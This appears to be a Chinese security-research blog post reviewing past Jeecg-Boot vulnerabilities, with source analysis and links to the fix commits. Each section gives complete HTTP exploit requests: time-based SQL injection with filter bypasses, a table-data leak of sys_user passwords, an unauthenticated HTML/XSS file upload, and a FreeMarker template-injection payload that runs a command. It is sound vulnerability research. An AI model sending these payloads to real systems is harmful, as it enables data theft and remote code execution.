<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我司的任务，原本是漏洞挖掘，在漏洞挖掘之前打算先看看历史漏洞，简单分析一下。<br>本文只聚焦与 Jeecg-Boot 相关的一些漏洞，一些组件漏洞暂时不关注。</p>
<p>各个版本的漏洞合集</p>
<p><a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&t=blog&u=zhangdaiscott&s=new">https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&amp;t=blog&amp;u=zhangdaiscott&amp;s=new</a></p>
<p>因为主要研究版本是从 Jeecg-Boot 3.0 开始的，所以 2.x.x 的版本漏洞就暂时不分析了。使用的版本是 3.2.0 的版本，相对来说非常稳定。</p>
<p>JeecgBoot常见问题大全 <a href="http://bbs.jeecg.com/forum.php?mod=viewthread&tid=7816&extra=page=1">http://bbs.jeecg.com/forum.php?mod=viewthread&amp;tid=7816&amp;extra=page%3D1</a></p>
<h2 id="CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞"><a href="#CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞" class="headerlink" title="CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞"></a>CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</h2><blockquote>
<p>3.0.0 &lt;&#x3D; Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</p>
</blockquote>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Jeecg-Boot</code> 后台服务 API 接口文档处存在 SQL 注入，漏洞对应接口为 <code>/sys/duplicate/check</code></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code class="http">GET /jeecg-boot/sys/duplicate/check?dataId=%27aa2000&amp;fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&amp;fieldVal=1000&amp;tableName=sys_log HTTP/1.1
Host: localhost:3000
knife4j-gateway-code: ROOT
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk
Connection: close

</code></pre>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>接口 <code>org.jeecg.modules.system.controller.DuplicateCheckController</code> 全流程概括一下就是经过一串过滤，最后执行 SQL 语句，对应的 SQL 语句为</p>
<pre><code class="xml">&lt;!-- 重复校验 sql语句 --&gt;  
&lt;select id=&quot;duplicateCheckCountSql&quot; resultType=&quot;Long&quot; parameterType=&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;&gt;  
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal} and id &amp;lt;&amp;gt; #{dataId}  
&lt;/select&gt;  
  
&lt;!-- 重复校验 sql语句 --&gt;  
&lt;select id=&quot;duplicateCheckCountSqlNoDataId&quot; resultType=&quot;Long&quot; parameterType=&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;&gt;  
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}&lt;/select&gt;
</code></pre>
<p>按照正常来说的 SQL 注入</p>
<pre><code class="payload">select * from users where updatexml(1,(select/**/if(length(&quot;aaa&quot;)&gt;5,1,sleep(5)) union select/**/1),1);
</code></pre>
<p>其中 <code>tableName</code> 契合注入点攻击即可。漏洞的本质原因是过滤的不完全。</p>
<p>{% asset_img 4129sqlFilter.png %}</p>
<p>可以看到这里的过滤为 <code>select </code>，多了个空格，很容易使用 <code>/**/</code> 进行绕过。</p>
<p>作者提出的 <code>replace()</code> 替换 <code>/**/</code> 也是修复不完全的，因为仍旧可以用 <code>()</code> 进行绕过</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb">https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb</a></p>
<p>{% asset_img fix4129.png %}</p>
<p>加了两个报错注入的关键字，很明显修复是不完全的，依旧存在安全隐患。后面要看的 jeecg-boot 3.4.4 存在 sql 注入漏洞就是如此；但是 3.4.4 的漏洞复现我失败了，不知道是什么原因。</p>
<h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞</h2><ul>
<li>和上一条其实是类似的</li>
</ul>
<h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>jeecg-boot3.4.4 存在 sql 注入漏洞，sql 注入检测代码存在绕过。接口为 <code>/sys/duplicate/check</code></p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code class="http">GET /jeecg-boot/sys/duplicate/check?dataId=2000&amp;fieldName=(select(if(((select%0Apassword%0Afrom%0Asys_user%0Awhere%0Ausername%0A=&#39;jeecg&#39;)=&#39;eee378a1258530cb&#39;),sleep(4),1)))&amp;fieldVal=1000&amp;tableName=test_person HTTP/1.1
Host: localhost:8080
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk
Connection: close

</code></pre>
<p>值得一提的是，这里的 sleep 时间取决于数据表里面放的数据多少，为 <code>n*时间</code></p>
<p>{% asset_img sql4393.png %}</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>没有什么特别需要分析的，简单的 bypass</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a</a></p>
<p>{% asset_img fix4393.png %}</p>
<p>增添的黑名单是 <code>geohash|gtid_subset|gtid_subtract</code>，没看懂</p>
<h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于 <code>AbstractQueryBlackListHandler</code> 类中的黑名单校验不严格，导致多个接口如 <code>sys/dict/queryTableData</code> 存在信息泄露漏洞。</p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code class="http">GET /jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password HTTP/1.1
Host: localhost:3000
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk
Connection: close

</code></pre>
<p>{% asset_img leakInfo4393.png %}</p>
<p>数据也被加密了，并没有什么太大的用处。</p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 <code>isPass()</code>函数中 <code>ruleMap.get(name)</code> 为 null 即可绕过, 可以采用 <code>sys_user</code>, <code>(sys_user)</code>, <code>sys_user%20</code> 等绕过</p>
<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a</a></p>
<p>加黑了</p>
<pre><code class="java">private String getTableName(String str) {
        String[] arr = str.split(&quot;\\s+(?i)where\\s+&quot;);
        // sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393
        String reg = &quot;\\s+|\\(|\\)|`&quot;;
        return arr[0].replaceAll(reg, &quot;&quot;);
    }
</code></pre>
<p>然而依旧可以用 &#96;&#96; bypass</p>
<pre><code class="http">GET /jeecg-boot/sys/dict/queryTableData?table=sys_user/**/&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password HTTP/1.1
Host: localhost:3000
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk
Connection: close

</code></pre>
<h2 id="Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞"><a href="#Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>经测试发现 <code>/jeecg-boot/jmreport/upload</code>接口存在未授权任意文件上传</p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>文件上传</p>
<pre><code class="http">POST /jeecg-boot/jmreport/upload HTTP/1.1
Host: localhost:8080
Content-Length: 460
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBB3U3apXylvyidXI
Referer: http://localhost:8080/jeecg-boot/jmreport/index/864289498073407488?menuType=datainfo&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og
Connection: close

------WebKitFormBoundaryBB3U3apXylvyidXI
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;
Content-Type: text/html

&lt;html&gt;
    &lt;body&gt;
    &lt;img src=x onerror=alert(1)&gt;
    &lt;/body&gt;
&lt;/html&gt;
------WebKitFormBoundaryBB3U3apXylvyidXI
Content-Disposition: form-data; name=&quot;fileName&quot;

xss.html
------WebKitFormBoundaryBB3U3apXylvyidXI
Content-Disposition: form-data; name=&quot;biz&quot;

excel_online
------WebKitFormBoundaryBB3U3apXylvyidXI--
</code></pre>
<p>文件上传不需要 token 验证，访问需要 token 验证。</p>
<pre><code class="http">GET /jeecg-boot/jimureport/xss1695174346254.html HTTP/1.1
Host: localhost:8080
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2
Connection: close

</code></pre>
<p>上传的文件甚至可以访问</p>
<p>{% asset_img shell4990.png %}</p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>对应的类处理 <code>org.jeecg.modules.jmreport.desreport.a.a</code> 类的 <code>upload</code> 接口。拿到 HTTP 请求当中文件上传请求的参数，往下走，进入 <code>local</code></p>
<p>{% asset_img 4990Local.png %}</p>
<p>下面就是文件上传的部分了，其实并没有做任何过滤。只是把 <code>../</code> 过滤了</p>
<p>{% asset_img noFilter4990.png %}</p>
<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>把 jimuReport 的版本升级到 1.6.1 +，最新的 diff 并没有找到，后续值得分析。</p>
<h2 id="CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入"><a href="#CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入" class="headerlink" title="CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入"></a>CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入</h2><ul>
<li>不得不提一嘴，SQL 注入真的太多了。</li>
</ul>
<h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>/sys/duplicate/check</code> 接口 SQL 注入，<code>checksql</code> 可以被绕过。</p>
<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code class="http">GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldName=1+and%09if(user(%20)=&#39;root@localhost&#39;,sleep(0),sleep(5))&amp;fieldVal=1&amp;dataId=asd HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU

</code></pre>
<p>{% asset_img sqli38905.png %}</p>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本质上来说也是黑名单绕过</p>
<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b">https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b</a></p>
<p>SQL 注入基本上都是在做黑名单的 bypass，分析 SQL 注入就分析到这里。</p>
<h2 id="CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入"><a href="#CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入" class="headerlink" title="CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入"></a>CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>JeecgBoot 受影响版本中由于积木报表 <code>/jeecg-boot/jmreport/queryFieldBySql</code> Api 接口未进行身份校验，使用 Freemarker 处理用户用户传入的 sql 参数，未经授权的攻击者可发送包含恶意 sql 参数的 http 请求，通过 SSTI 在应用端执行任意代码。</p>
<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code class="http">POST /jeecgboot/jmreport/queryFieldBySql HTTP/1.1
Host: localhost:3100
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: http://172.20.10.2:3100/login?redirect=/dashboard/analysis
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 103

{&quot;sql&quot;:&quot;sekect &#39;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${ex(\&quot;calc\&quot;)}&#39;&quot;
}

</code></pre>
<p>postman 发包</p>
<p>{% asset_img freemarkerRCE.png %}</p>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口对应 <code>org.jeecg.modules.jmreport.desreport.a.a#c()</code> 方法，先过了 sql 的黑名单，随后调用 <code>this.reportDbService.parseReportSql()</code> 方法。</p>
<p>{% asset_img parseReportSql.png %}</p>
<p>跟进去是调用了动态代理，代理了 <code>target</code> 对象的 <code>method</code> 方法,并在执行该方法时传入 <code>argsToUse</code>参数，动调能够看到调用的是  <code>org.jeecg.modules.jmreport.desreport.service.a.i#parseReportSql</code> 方法。一路调用后来到 <code>org.jeecg.modules.jmreport.desreport.util.e#a</code> 方法；其中调用了 <code>FreeMarkerUtils.a()</code></p>
<p>{% asset_img FreeMarkerUtils.png %}</p>
<p>跟进之后发现从这里开始新建了一个 Template，并加工表达式。后面就是 FreeMarker 执行表达式的过程了，这里不再赘述。</p>
<p>{% asset_img process.png %}</p>
<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae">https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae</a></p>
<p><a href="https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5">https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5</a></p>
<p>看着没啥问题，是完整的修复。</p>
